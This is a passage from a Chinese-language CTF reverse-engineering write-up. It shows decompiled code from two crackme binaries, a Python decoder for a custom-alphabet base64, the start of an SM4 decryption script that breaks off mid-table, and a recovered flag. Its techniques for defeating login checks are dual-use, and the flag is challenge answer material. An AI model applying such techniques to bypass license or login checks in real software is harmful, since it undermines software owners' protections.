class="comment">// [rsp+58h] [rbp-A8h]</span></span><br><span class="line">  char v27; <span class="comment">// [rsp+80h] [rbp-80h]</span></span><br><span class="line">  <span class="variable">__int64</span> v28; <span class="comment">// [rsp+98h] [rbp-68h]</span></span><br><span class="line">  <span class="variable">__int64</span> v29; <span class="comment">// [rsp+A0h] [rbp-60h]</span></span><br><span class="line">  <span class="variable">__int128</span> v30; <span class="comment">// [rsp+A8h] [rbp-58h]</span></span><br><span class="line">  <span class="variable">__int128</span> v31; <span class="comment">// [rsp+B8h] [rbp-48h]</span></span><br><span class="line">  <span class="variable">__int128</span> v32; <span class="comment">// [rsp+C8h] [rbp-38h]</span></span><br><span class="line">  <span class="variable">__int128</span> v33; <span class="comment">// [rsp+D8h] [rbp-28h]</span></span><br><span class="line">  <span class="variable">__int128</span> v34; <span class="comment">// [rsp+E8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (unsigned <span class="variable">__int64</span>)&amp;v27 &lt;= *(<span class="variable">_QWORD</span> *)(<span class="variable">__readfsqword</span>(<span class="number">0</span>xFFFFFFF8) + <span class="number">16</span>) )</span><br><span class="line">    runtime_morestack_noctxt(a1, a2);</span><br><span class="line">  runtime_newobject(a1, a2);</span><br><span class="line">  v29 = v24;</span><br><span class="line">  *(<span class="variable">_QWORD</span> *)&amp;v34 = &amp;unk_4A6D00;</span><br><span class="line">  *((<span class="variable">_QWORD</span> *)&amp;v34 + <span class="number">1</span>) = &amp;off_4E1130;</span><br><span class="line">  fmt_Fprintln(a1, a2, (<span class="variable">__int64</span>)&amp;v34, (<span class="variable">__int64</span>)&amp;unk_4A6D00, v2, v3, (<span class="variable">__int64</span>)&amp;off_4E28A0, qword_572B18);</span><br><span class="line">  *(<span class="variable">_QWORD</span> *)&amp;v33 = &amp;unk_4A3E80;</span><br><span class="line">  *((<span class="variable">_QWORD</span> *)&amp;v33 + <span class="number">1</span>) = v29;</span><br><span class="line">  fmt_Fscanf(</span><br><span class="line">    a1,</span><br><span class="line">    a2,</span><br><span class="line">    (<span class="variable">__int64</span>)&amp;off_4E2880,</span><br><span class="line">    (<span class="variable">__int64</span>)&amp;v33,</span><br><span class="line">    v4,</span><br><span class="line">    v5,</span><br><span class="line">    (<span class="variable">__int64</span>)&amp;off_4E2880,</span><br><span class="line">    qword_572B10,</span><br><span class="line">    (<span class="variable">__int64</span>)&amp;unk_4C8569,</span><br><span class="line">    <span class="number">2</span>LL);</span><br><span class="line">  runtime_stringtoslicebyte(a1, a2, v6, v7, v8, v9);</span><br><span class="line">  *(<span class="variable">_QWORD</span> *)&amp;v10 = &amp;v26;</span><br><span class="line">  *((<span class="variable">_QWORD</span> *)&amp;v10 + <span class="number">1</span>) = v11;</span><br><span class="line">  runtime_slicebytetostring(a1, a2, v11, <span class="number">1</span>, v12, v10);</span><br><span class="line">  encoding_base64__ptr_Encoding_DecodeString(a1, a2, <span class="number">1</span>LL, (<span class="variable">__int64</span>)&amp;v33, v13, v14, qword_572B00, (<span class="variable">__int64</span>)&amp;v33, <span class="number">1</span>uLL);</span><br><span class="line">  v28 = <span class="number">1</span>LL;</span><br><span class="line">  MEMORY[<span class="number">0</span>x19](a1);</span><br><span class="line">  runtime_convTstring(a1, a2, v19);</span><br><span class="line">  *(<span class="variable">_QWORD</span> *)&amp;v32 = &amp;unk_4A6D00;</span><br><span class="line">  *((<span class="variable">_QWORD</span> *)&amp;v32 + <span class="number">1</span>) = v25;</span><br><span class="line">  fmt_Fprintln(a1, a2, (<span class="variable">__int64</span>)&amp;off_4E28A0, (<span class="variable">__int64</span>)&amp;unk_4A6D00, v20, v21, (<span class="variable">__int64</span>)&amp;off_4E28A0, qword_572B18);</span><br><span class="line">  <span class="keyword">if</span> ( *(<span class="variable">__int128</span> **)(v29 + <span class="number">8</span>) == &amp;v33 )</span><br><span class="line">  &#123;</span><br><span class="line">    runtime_memequal(a1, a2, v28, *(<span class="variable">_QWORD</span> *)v29);</span><br><span class="line">    *(<span class="variable">_QWORD</span> *)&amp;v31 = &amp;unk_4A6D00;</span><br><span class="line">    *((<span class="variable">_QWORD</span> *)&amp;v31 + <span class="number">1</span>) = &amp;off_4E1140;</span><br><span class="line">    result = fmt_Fprintln(a1, a2, v16, (<span class="variable">__int64</span>)&amp;off_4E28A0, v17, v18, (<span class="variable">__int64</span>)&amp;off_4E28A0, qword_572B18);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *(<span class="variable">_QWORD</span> *)&amp;v30 = &amp;unk_4A6D00;</span><br><span class="line">    *((<span class="variable">_QWORD</span> *)&amp;v30 + <span class="number">1</span>) = &amp;off_4E1150;</span><br><span class="line">    result = fmt_Fprintln(a1, a2, v28, (<span class="variable">__int64</span>)&amp;off_4E28A0, v22, v23, (<span class="variable">__int64</span>)&amp;off_4E28A0, qword_572B18);</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>大致扫一眼发现存在base64加密，然后发现有几个特殊的字符串引用<br><img src="https://s2.ax1x.com/2019/04/25/EezEnA.png" alt><br><img src="https://s2.ax1x.com/2019/04/25/EezmAP.png" alt><br>推断出这是一个魔改base64，然后解密即可得到flag</p>
<p>exp：<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">def mybase64decode(ciphertext):</span><br><span class="line">	index_table = <span class="string">"6789_-abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ012345"</span></span><br><span class="line">	<span class="built_in">num</span>=<span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(len(ciphertext)):</span><br><span class="line">		<span class="keyword">if</span> ciphertext[x]==<span class="string">"="</span>:</span><br><span class="line">			<span class="built_in">num</span>+=<span class="number">1</span></span><br><span class="line">	ciphertext =ciphertext.replace(<span class="string">"="</span>,<span class="string">""</span>)</span><br><span class="line">	arr = []</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(len(ciphertext)):</span><br><span class="line">		arr.<span class="built_in">append</span>(index_table.index(ciphertext[x]))</span><br><span class="line">	binary_str = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(len(arr)):</span><br><span class="line">		binary_str+=bin(arr[y])[<span class="number">2</span>:].rjust(<span class="number">6</span>,<span class="string">"0"</span>)</span><br><span class="line">	binary_str = binary_str[<span class="number">0</span>:len(binary_str)-(<span class="built_in">num</span>*(<span class="number">8</span>-<span class="number">6</span>))]</span><br><span class="line">	plaintext = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,len(binary_str),<span class="number">8</span>):</span><br><span class="line">		plaintext+=chr(<span class="built_in">eval</span>(<span class="string">"0b"</span>+binary_str[x:x+<span class="number">8</span>]))</span><br><span class="line">	<span class="built_in">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> mybase64decode(<span class="string">"tGRBtXMZgD6ZhalBtCUTgWgZfnkTgqoNsnAVsmUYsGtCt9pEtDEYsql3"</span>)</span><br></pre></td></tr></table></figure></p>
<p>但是我在做的时候并没有这样做，我首先看到mian函数中有一个if判断，然后在gdb中在if处下断点，然后就可以看到flag了，emmm<br><img src="https://s2.ax1x.com/2019/04/25/Eezuh8.png" alt> </p>
<h4 id="flag：flag-92094daf-33c9-431e-a85a-8bfbd5df98ad"><a href="#flag：flag-92094daf-33c9-431e-a85a-8bfbd5df98ad" class="headerlink" title="flag：flag{92094daf-33c9-431e-a85a-8bfbd5df98ad}"></a>flag：flag{92094daf-33c9-431e-a85a-8bfbd5df98ad}</h4><h3 id="bbvvmm"><a href="#bbvvmm" class="headerlink" title="bbvvmm"></a>bbvvmm</h3><p>任然是elf文件</p>
<p>首先看到main函数中<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  char *s1; <span class="comment">// ST28_8</span></span><br><span class="line">  char v5; <span class="comment">// ST1B_1</span></span><br><span class="line">  unsigned __int8 i; <span class="comment">// [rsp+19h] [rbp-1A7h]</span></span><br><span class="line">  int v8; <span class="comment">// [rsp+1Ch] [rbp-1A4h]</span></span><br><span class="line">  void *v9; <span class="comment">// [rsp+20h] [rbp-1A0h]</span></span><br><span class="line">  char v10; <span class="comment">// [rsp+30h] [rbp-190h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+140h] [rbp-80h]</span></span><br><span class="line">  char v12; <span class="comment">// [rsp+148h] [rbp-78h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+150h] [rbp-70h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+158h] [rbp-68h]</span></span><br><span class="line">  __int64 v15; <span class="comment">// [rsp+160h] [rbp-60h]</span></span><br><span class="line">  __int64 v16; <span class="comment">// [rsp+168h] [rbp-58h]</span></span><br><span class="line">  char v17; <span class="comment">// [rsp+170h] [rbp-50h]</span></span><br><span class="line">  char v18; <span class="comment">// [rsp+171h] [rbp-4Fh]</span></span><br><span class="line">  char v19; <span class="comment">// [rsp+172h] [rbp-4Eh]</span></span><br><span class="line">  char v20; <span class="comment">// [rsp+173h] [rbp-4Dh]</span></span><br><span class="line">  char v21; <span class="comment">// [rsp+174h] [rbp-4Ch]</span></span><br><span class="line">  char v22; <span class="comment">// [rsp+175h] [rbp-4Bh]</span></span><br><span class="line">  char v23; <span class="comment">// [rsp+176h] [rbp-4Ah]</span></span><br><span class="line">  char v24; <span class="comment">// [rsp+177h] [rbp-49h]</span></span><br><span class="line">  char v25; <span class="comment">// [rsp+178h] [rbp-48h]</span></span><br><span class="line">  char v26; <span class="comment">// [rsp+179h] [rbp-47h]</span></span><br><span class="line">  char v27; <span class="comment">// [rsp+17Ah] [rbp-46h]</span></span><br><span class="line">  char v28; <span class="comment">// [rsp+17Bh] [rbp-45h]</span></span><br><span class="line">  char v29; <span class="comment">// [rsp+17Ch] [rbp-44h]</span></span><br><span class="line">  char v30; <span class="comment">// [rsp+17Dh] [rbp-43h]</span></span><br><span class="line">  char v31; <span class="comment">// [rsp+17Eh] [rbp-42h]</span></span><br><span class="line">  char v32; <span class="comment">// [rsp+17Fh] [rbp-41h]</span></span><br><span class="line">  __int64 v33; <span class="comment">// [rsp+180h] [rbp-40h]</span></span><br><span class="line">  __int64 v34; <span class="comment">// [rsp+188h] [rbp-38h]</span></span><br><span class="line">  char s[<span class="number">8</span>]; <span class="comment">// [rsp+190h] [rbp-30h]</span></span><br><span class="line">  __int64 v36; <span class="comment">// [rsp+198h] [rbp-28h]</span></span><br><span class="line">  __int64 v37; <span class="comment">// [rsp+1A0h] [rbp-20h]</span></span><br><span class="line">  __int64 v38; <span class="comment">// [rsp+1A8h] [rbp-18h]</span></span><br><span class="line">  char v39; <span class="comment">// [rsp+1B0h] [rbp-10h]</span></span><br><span class="line">  unsigned __int64 v40; <span class="comment">// [rsp+1B8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v40 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v9 = malloc(<span class="number">0x4D0</span>uLL);</span><br><span class="line">  setbuf(stdin, <span class="number">0</span>LL);</span><br><span class="line">  setbuf(stdout, <span class="number">0</span>LL);</span><br><span class="line">  setbuf(stderr, <span class="number">0</span>LL);</span><br><span class="line">  puts(<span class="string">"Powered by ????? !"</span>);</span><br><span class="line">  sub_406656(<span class="string">"Powered by ????? !"</span>, <span class="number">0</span>LL);</span><br><span class="line">  puts(<span class="string">"---------[LOGIN]---------"</span>);</span><br><span class="line">  printf(<span class="string">"Username:"</span>, a2);</span><br><span class="line">  vm_index((__int64)v9);</span><br><span class="line">  v11 = <span class="number">0</span>LL;</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  __isoc99_scanf(<span class="string">"%9s"</span>, &amp;v11);</span><br><span class="line">  printf(<span class="string">"\x1B[?25l"</span>, &amp;v11);</span><br><span class="line">  printf(<span class="string">"Password:"</span>);</span><br><span class="line">  for ( i = <span class="number">0</span>; i &lt;= <span class="number">5</span>u; ++i )</span><br><span class="line">    read(<span class="number">0</span>, (char *)ptr + <span class="number">4</span> * (i + <span class="number">36</span>LL), <span class="number">1</span>uLL);</span><br><span class="line">  vm((__int64)v9);</span><br><span class="line">  *(_QWORD *)s = <span class="number">0</span>LL;</span><br><span class="line">  v36 = <span class="number">0</span>LL;</span><br><span class="line">  v37 = <span class="number">0</span>LL;</span><br><span class="line">  v38 = <span class="number">0</span>LL;</span><br><span class="line">  v39 = <span class="number">0</span>;</span><br><span class="line">  v13 = <span class="number">0</span>LL;</span><br><span class="line">  v14 = <span class="number">0</span>LL;</span><br><span class="line">  str_to_hex((__int64)&amp;v11, (__int64)&amp;v13, <span class="number">8</span>);</span><br><span class="line">  v15 = <span class="number">0</span>LL;</span><br><span class="line">  v16 = <span class="number">0</span>LL;</span><br><span class="line">  v17 = <span class="number">-38</span>;</span><br><span class="line">  v18 = <span class="number">-104</span>;</span><br><span class="line">  v19 = <span class="number">-15</span>;</span><br><span class="line">  v20 = <span class="number">-38</span>;</span><br><span class="line">  v21 = <span class="number">49</span>;</span><br><span class="line">  v22 = <span class="number">42</span>;</span><br><span class="line">  v23 = <span class="number">-73</span>;</span><br><span class="line">  v24 = <span class="number">83</span>;</span><br><span class="line">  v25 = <span class="number">-91</span>;</span><br><span class="line">  v26 = <span class="number">112</span>;</span><br><span class="line">  v27 = <span class="number">58</span>;</span><br><span class="line">  v28 = <span class="number">11</span>;</span><br><span class="line">  v29 = <span class="number">-3</span>;</span><br><span class="line">  v30 = <span class="number">41</span>;</span><br><span class="line">  v31 = <span class="number">13</span>;</span><br><span class="line">  v32 = <span class="number">-42</span>;</span><br><span class="line">  v33 = <span class="number">0</span>LL;</span><br><span class="line">  v34 = <span class="number">0</span>LL;</span><br><span class="line">  sub_401738(&amp;v10, (unsigned __int8 *)&amp;v17);</span><br><span class="line">  sub_4018C4((__int64)&amp;v10, <span class="number">1</span>, <span class="number">16</span>, &amp;v15, &amp;v13, &amp;v33);</span><br><span class="line">  sub_4067BD((__int64)&amp;v33, (__int64)s, <span class="number">16</span>);</span><br><span class="line">  v3 = strlen(s);</span><br><span class="line">  s1 = base64_encode(s, v3);</span><br><span class="line">  v5 = strcmp(s1, <span class="string">"RVYtG85NQ9OPHU4uQ8AuFM+MHVVrFMJMR8FuF8WJQ8Y="</span>);</span><br><span class="line">  printf(<span class="string">"\x1B[?25h"</span>, <span class="string">"RVYtG85NQ9OPHU4uQ8AuFM+MHVVrFMJMR8FuF8WJQ8Y="</span>);</span><br><span class="line">  v8 = *((_DWORD *)ptr + <span class="number">25</span>);</span><br><span class="line">  sub_405AA8();</span><br><span class="line">  if ( v5 || v8 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(<span class="string">"<span class="subst">\n</span>----------[EXIT]----------"</span>);</span><br><span class="line">    system(<span class="string">"exit"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(<span class="string">"<span class="subst">\n</span>---------[WELCOME]---------"</span>);</span><br><span class="line">    system(<span class="string">"cat flag"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  return <span class="number">0</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>分别读取了用户名和6位的密码</p>
<p>对于输入用户名的字符串，首先是把输入转成16进制字符串（一位变两位），然后是一个SMS4加密（通过关键数值可以确定加密算法0xA3B1BAC6），然后是又一个魔改的base64加密，最后与正确字符串进行比较</p>
<p>解密魔改脚本和上面第一题的一样，把index_table改一下就可以了，解密出来的字符串如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EF468DBAF985B2509C9E200CF3525AB6</span><br></pre></td></tr></table></figure></p>
<p>SMS4解密脚本是在网上找到的：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br></pre></td><td class="code"><pre><span class="line">#-*-coding:utf-<span class="number">8</span>-*-</span><br><span class="line">from print_log import *</span><br><span class="line">import copy</span><br><span class="line"></span><br><span class="line">#Expanded SM4 S-boxes    Sbox table: 8<span class="meta">bits</span> input convert to <span class="number">8</span> <span class="meta">bits</span> output</span><br><span class="line">SboxTable = [</span><br><span class="line"><span class="number">0xd6</span>,<span class="number">0x90</span>,<span class="number">0xe9</span>,<span class="number">0xfe</span>,<span class="number">0xcc</span>,<span class="number">0xe1</span>,<span class="number">0x3d</span>,<span class="number">0xb7</span>,<span class="number">0x16</span>,<span class="number">0xb6</span>,<span class="number">0x14</span>,<span class="number">0xc2</span>,<span class="number">0x28</span>,<span class="number">0xfb</span>,<span class="number">0x2c</span>,<span class="number">0x05</span>,</span><br><span class="line"><span class="number">0x2b</span>,<span class="number">0x67</span>,<span class="number">0x9a</span>,<span class="number">0x76</span>,<span class="number">0x2a</span>,<span class="number">0xbe</span>,<span class="number">0x04</span>,<span class="number">0xc3</span>,<span class="number">0xaa</span>,<span class="number">0x44</span>,<span class="number">0x13</span>,<span class="number">0x26</span>,<span class="number">0x49</span>,<span class="number">0x86</span>,<span class="number">0x06</span>,<span class="number">0x99</span>,</span><br><span class="line"><span class="number">0x9c</span>,<span class="number">0x42</span>,<span class="number">0x50</span>,<span class="number">0xf4</span>,<span class="number">0x91</span>,<span class="number">0xef</span>,<span class="number">0x98</span>,<span class="number">0x7a</span>,<span class="number">0x33</span>,<span class="number">0x54</span>,<span class="number">0x0b</span>,<span class="number">0x43</span>,<span class="number">0xed</span>,<span class="number">0xcf</span>,<span class="number">0xac</span>,<span class="number">0x62</span>,</span><br><span class="line"><span class="number">0xe4</span>,<span class="number">0xb3</span>,<span class="number">0x1c</span>,<span class="number">0xa9</span>,<span class="number">0xc9</span>,<span class="number">0x08</span>,<span class="number">0xe8</span>,<span class="number">0x95</span>,<span class="number">0x80</span>,<span class="number">0xdf</span>,<span class="number">0x94</span>,<span class="number">0xfa</span>,<span class="number">0x75</span>,<span class="number">0x8f</span>,<span class="number">0x3f</span>,<span class="number">0xa6</span>,</span><br><span class="line"><span class="number">0x47</span>,<span class="number">0x07</span>,<span class="number">0xa7</span>,<span class="number">0xfc</span>,<span class="number">0xf3</span>,<span class="number">0x73</span>,<span class="number">0x17</span>,<span class="number">0xba</span>,<span class="number">0x83</span>,<span class="number">0x59</span>,<span class="number">0x3c</span>,<span class="number">0x19</span>,<span class="number">0xe6</span>,<span class="number">0x85</span>,<span class="number">0x4f</span>,<span class="number">0xa8</span>,</span><br><span class="line"><span class="number">0x68</span>,<span class="number">0x6b</span>,<span class="number">0x81</span>,<span class="number">0xb2</span>,<span class="number">0x71</span>,<span class="number">0x64</span>,<span class="number">0xda</span>,<span class="number">0x8b</span>,<span class="number">0xf8</span>,<span class="number">0xeb</span>,<span class="number">0x0f</span>,<span class="number">0x4b</span>,<span class="number">0x70</span>,<span class="number">0x56</span>,<span class="number">0x9d</span>,<span class="number">0x35</span>,</span><br><span class="line"><span class="number">0x1e</span>,<span class="number">0x24</span>,<span class="number">0x0e</span>,<span class="number">0x5e</span>,<span class="number">0x63</span>,<span class="number">0x58</span>,<span class="number">0xd1</span>,<span class="number">0xa2</span>,<span class="number">0x25</span>,<span class="number">0x22</span>,<span class="number">0x7c</span>,<span class="number">0x3b</span>,<span class="number">0x01</span>,<span class="number">0x21</span>,<span class="number">0x78</span>,<span class="number">0x87</span>,</span><br><span class="line"><span class="number">0xd4</span>,<span class="number">0x00</span>,<span class="number">0x46</span>,<span class="number">0x57</span>,<span class="number">0x9f</span>,<span class="number">0xd3</span>,<span class="number">0x27</span>,<span class="number">0x52</span>,<span class="number">0x4c</span>,<span class="number">0x36</span>,<span class="number">0x02</span>,<span class="number">0xe7</span>,<span class="number">0xa0</span>,<span class="number">0xc4</span>,<span class="number">0xc8</span>,<span class="number">0x9e</span>,</span><br><span class="line"><span class="number">0xea</span>,<span class="number">0xbf</span>,<span class="number">0x8a</span>,<span class="number">0xd2</span>,<span class="number">0x40</span>,<span class="number">0xc7</span>,<span class="number">0x38</span>,<span class="number">0xb5</span>,<span class="number">0xa3</span>,<span class="number">0xf7</span>,<span class="number">0xf2</span>,<span class="number">0xce</span>,<span class="number">0xf9</span>,<span class="number">0x61</span>,<span class="number">0x15</span>,<span class="number">0xa1</span>,</span><br><span class="line"><span class="number">0xe0</span>,<span class="number">0xae</span>,<span class="number">0x5d</span>,<span class="number">0xa4</span>,<span class="number">0x9b</span>,<span class="number">0x34</span>,<span class="number">0x1a</span>,<span class="number">0x55</span>,<span class="number">0xad</span>,<span class="number">0x93</span>,<span class="number">0x32</span>,<span class="number">0x30</span>,<span class="number">0xf5</span>,<span class="number">0x8c</span>,<span class="number">0xb1</span>,<span class="number">0xe3</span>,</span><br><span class="line"><span class="number">0x1d</span>,<span class="number">0xf6</span>,<span class="number">0xe2</span>,<span class="number">0x2e</span>,<span class="number">0x82</span>,<span class="number">0x66</span>,<span class="number">0xca</span>,<span class="number">0x60</span>,<span class="number">0xc0</span>,<span class="number">0x29</span>,<span class="number">0x23</span>,<span class="number">0xab</span>,<span class="number">0x0d</span>,<span class="number">0x53</span>,<span class="number">0x4e</span>,<span class="number">0x6f</span>,</span><br><span class="line"><span class="number">0xd5</span>,<span class="number">0xdb</span>,<span class="number">0x37</span>,<span class="number">0x45</span>,<span class="number">0xde</span>,<span class="number">0xfd</span>,<span class="number">0x8e</span>,<span class="number">0x2f</span>,<span class="number">0x03</span>,<span class="number">0xff</span>,<span class="number">0x6a</span>,<span class="number">0x72</span>,<span class="number">0x6d</span>,<span class="number">0x6c</span>,<span class="number">0x5b</span>,<span class="number">0x51</span>,</span><br><span class="line"><span class="number">0x8d</span>,<span class="number">0x1b</span>,<span class="number">0xaf</span>,<span class="number">0x92</span>,<span class="number">0xbb</span>,<span class="number">0xdd</span>,<span 